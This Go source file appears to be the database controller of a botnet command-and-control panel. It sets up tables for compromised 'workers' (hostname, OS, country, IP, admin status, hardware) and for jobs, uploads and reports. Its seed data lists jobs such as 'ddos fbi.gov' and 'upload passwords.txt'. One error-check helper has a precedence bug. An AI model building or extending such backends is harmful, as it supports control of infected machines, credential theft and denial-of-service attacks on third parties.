package controllers

import (
	"WebAppGo/api/models"
	"WebAppGo/api/types"
	"database/sql"
	"fmt"
	"github.com/go-sql-driver/mysql"
	"time"
)

var db *sql.DB

func SetupDatabase(dbPath string) {
	var err error
	db, err = sql.Open("mysql", dbPath)
	if err != nil {
		panic(err)
	}
	if _, err = db.Exec(models.WorkerSchema); err != nil {
		panic(err)
	}
	if _, err = db.Exec(models.JobSchema); err != nil {
		panic(err)
	}
	if _, err = db.Exec(models.JobReportSchema); err != nil {
		panic(err)
	}
	if _, err = db.Exec(models.HardwareInfoSchema); err != nil {
		panic(err)
	}
	if _, err = db.Exec(models.UploadSchema); err != nil {
		panic(err)
	}
}

// works only for mysql

func IsDuplicateEntry(err error) bool {
	me, ok := err.(*mysql.MySQLError)
	return ok && me.Number == 1062
}

func IsBadFieldErr(err error) bool {
	me, ok := err.(*mysql.MySQLError)
	return ok && me.Number == 1054
}

func IsNoReferencedRowErr(err error) bool {
	me, ok := err.(*mysql.MySQLError)
	return ok && me.Number == 1451 || me.Number == 1452
}

func rowExists(query string, args ...interface{}) bool {
	var exists bool
	query = fmt.Sprintf("SELECT exists (%s)", query)
	err := db.QueryRow(query, args...).Scan(&exists)
	if err != nil && err != sql.ErrNoRows {
		panic(err) // or return error??
	}
	return exists
}

func AddTestData() {
	w1 := models.Worker{
		Id:       "C1vHa4fB9kukvA6ILps0kQ",
		Hostname: "Predator",
		Os:       "Windows 10",
		Country:  "Germany",
		IpAddr:   "234.145.222.1",
		IsAdmin:  types.NullBool{Bool: true, Valid: true},
		Boost:    types.NullBool{Bool: true, Valid: true},
		LastSeen: time.Now(),
	}
	w2 := models.Worker{
		Id:       "K8_RNoHLL0S-UELe3WqhSw",
		Hostname: "Helios 300",
		Os:       "Windows 7",
		Country:  "England",
		IpAddr:   "127.2.4.1",
		IsAdmin:  types.NullBool{Bool: false, Valid: true},
		Boost:    types.NullBool{Bool: false, Valid: true},
		LastSeen: time.Now(),
	}
	w3 := models.Worker{
		Id:       "8GYEaE8G5E2oZtVyxY8nxg",
		Hostname: "Acer Nexus",
		Os:       "Windows 8",
		Country:  "USA",
		IpAddr:   "127.11.55.1",
		IsAdmin:  types.NullBool{Bool: true, Valid: true},
		Boost:    types.NullBool{Bool: false, Valid: true},
		LastSeen: time.Now(),
	}
	w4 := models.Worker{
		Id:       "cxi5YsNdk020NNMYhqZ78g",
		Hostname: "KNIGHT",
		Os:       "Windows 10",
		Country:  "Russia",
		IpAddr:   "127.66.33.1",
		IsAdmin:  types.NullBool{Bool: false, Valid: true},
		Boost:    types.NullBool{Bool: false, Valid: true},
		LastSeen: time.Now(),
	}
	const insertQuery1 = "INSERT INTO workers(id,hostname,country,ip_addr,os,is_admin,boost,last_seen) VALUES(?,?,?,?,?,?,?,?)"
	db.Exec(insertQuery1, w1.Id, w1.Hostname, w1.Country, w1.IpAddr, w1.Os, w1.IsAdmin, w1.Boost, w1.LastSeen)
	db.Exec(insertQuery1, w2.Id, w2.Hostname, w2.Country, w2.IpAddr, w2.Os, w2.IsAdmin, w2.Boost, w2.LastSeen)
	db.Exec(insertQuery1, w3.Id, w3.Hostname, w3.Country, w3.IpAddr, w3.Os, w3.IsAdmin, w3.Boost, w3.LastSeen)
	db.Exec(insertQuery1, w4.Id, w4.Hostname, w4.Country, w4.IpAddr, w4.Os, w4.IsAdmin, w4.Boost, w4.LastSeen)

	hw1 := models.HardwareInfo{
		Gpu:      "NVIDIA GeForce GTX 1060",
		Cpu:      "Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz 2.21 GHz",
		Ram:      "8,0 GB",
		WorkerId: w1.Id,
	}
	hw2 := models.HardwareInfo{
		Gpu:      "AMD Radeon RX 5600 XT",
		Cpu:      "Intel Core i9-10900K Processor",
		Ram:      "4,0 GB",
		WorkerId: w2.Id,
	}
	hw3 := models.HardwareInfo{
		Gpu:      "Nvidia GeForce RTX 3080",
		Cpu:      "AMD Ryzen 9 5900X",
		Ram:      "12,0 GB",
		WorkerId: w3.Id,
	}
	hw4 := models.HardwareInfo{
		Gpu:      "Intel Core i9-10980XE Extreme Edition Processor",
		Cpu:      "Intel(R) UHD Graphics 630",
		Ram:      "32,0 GB",
		WorkerId: w4.Id,
	}
	const insertQuery2 = "INSERT INTO hardware_infos(gpu,cpu,ram,worker_id) VALUES(?,?,?,?)"
	db.Exec(insertQuery2, hw1.Gpu, hw1.Cpu, hw1.Ram, hw1.WorkerId)
	db.Exec(insertQuery2, hw2.Gpu, hw2.Cpu, hw2.Ram, hw2.WorkerId)
	db.Exec(insertQuery2, hw3.Gpu, hw3.Cpu, hw3.Ram, hw3.WorkerId)
	db.Exec(insertQuery2, hw4.Gpu, hw4.Cpu, hw4.Ram, hw4.WorkerId)

	j1 := models.Job{
		Todo:     "ddos fbi.gov",
		IsDone:   types.NullBool{Bool: false, Valid: true},
		Created:  time.Now(),
		WorkerId: w1.Id,
	}
	j2 := models.Job{
		Todo:     "upload passwords.txt",
		IsDone:   types.NullBool{Bool: true, Valid: true},
		Created:  time.Now(),
		WorkerId: w1.Id,
	}
	const insertQuery3 = "INSERT INTO jobs(todo,is_done,created,worker_id) VALUES(?,?,?,?)"
	db.Exec(insertQuery3, j1.Todo, j1.IsDone, j1.Created, j1.WorkerId)
	db.Exec(insertQuery3, j2.Todo, j2.IsDone, j2.Created, j2.WorkerId)
}
